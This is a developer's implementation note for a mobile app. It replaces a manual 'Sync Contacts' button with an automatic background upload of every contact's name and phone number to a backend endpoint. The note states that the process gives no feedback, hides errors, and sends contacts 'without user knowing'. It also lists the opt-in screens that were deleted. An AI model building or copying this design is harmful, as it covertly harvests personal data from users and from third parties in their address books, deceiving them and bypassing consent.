# Contact Auto-Sync Implementation

## Overview
Contacts are now automatically synced in the background when the user opens the app. No manual button or UI interaction is required.

## How It Works

### 1. Automatic Trigger
- When user reaches **Home Screen** (after login/splash)
- `HomeController.onInit()` automatically calls `_autoSyncContacts()`

### 2. One-Time Sync
- Checks if contacts were already synced (`lastSyncTime != null`)
- If already synced, skips to avoid duplicate API calls
- If not synced, proceeds with sync

### 3. Silent Background Process
- No UI feedback or loading indicators
- Runs in background without disturbing user
- Silently fails if permission denied or error occurs

### 4. Permission Flow
- Requests `READ_CONTACTS` permission automatically
- If user denies, sync fails silently (no error shown)
- If user grants, reads all contacts and syncs to backend

## Implementation Files

### Modified Files:
1. **`lib/modules/home/home_controller.dart`**
   - Added `import '../../core/services/contact_service.dart';`
   - Added `_autoSyncContacts()` method in `onInit()`
   - Initializes `ContactService` if not registered
   - Calls `contactService.syncContacts()` silently

2. **`lib/modules/profile/profile_view.dart`**
   - Removed "Sync Contacts" button (no longer needed)

3. **`lib/routes/app_routes.dart`**
   - Removed `contactSync` route

4. **`lib/routes/app_pages.dart`**
   - Removed ContactSync page configuration
   - Removed ContactSync imports

### Deleted Files:
- `lib/modules/contacts/contact_sync_view.dart` (UI no longer needed)
- `lib/modules/contacts/contact_sync_controller.dart` (UI controller no longer needed)
- `lib/modules/contacts/contact_sync_binding.dart` (Binding no longer needed)

### Core Service (Unchanged):
- **`lib/core/services/contact_service.dart`** - Handles all contact sync logic

## API Endpoint
- **POST** `https://trends.rektech.work/api/contacts/store`
- **Request Body:**
  ```json
  {
    "contacts": [
      {"name": "John Doe", "phone_number": "+1234567890"},
      {"name": "Jane Smith", "phone_number": "+0987654321"}
    ]
  }
  ```
- **Response:**
  ```json
  {
    "success": true,
    "message": "Contacts saved successfully",
    "data": {"saved_count": 2}
  }
  ```

## Permissions
Already configured in `android/app/src/main/AndroidManifest.xml`:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.WRITE_CONTACTS"/>
```

## User Experience
1. User logs in → Splash screen → Home screen loads
2. **Silently in background:** Permission requested → Contacts read → API call made
3. User continues using app normally (no interruption)
4. Contacts synced to backend without user knowing

## Testing
1. Fresh install app
2. Login with credentials
3. Home screen loads
4. Check logs for:
   - `📱 Auto-syncing contacts in background...`
   - `✅ Contacts auto-synced successfully`
5. Check backend to verify contacts were saved

## Error Handling
- All errors are caught and logged silently
- No error messages shown to user
- App continues working normally even if sync fails
- Debug logs available for troubleshooting:
  - `⚠️ Auto-sync contacts failed (silent): [error]`
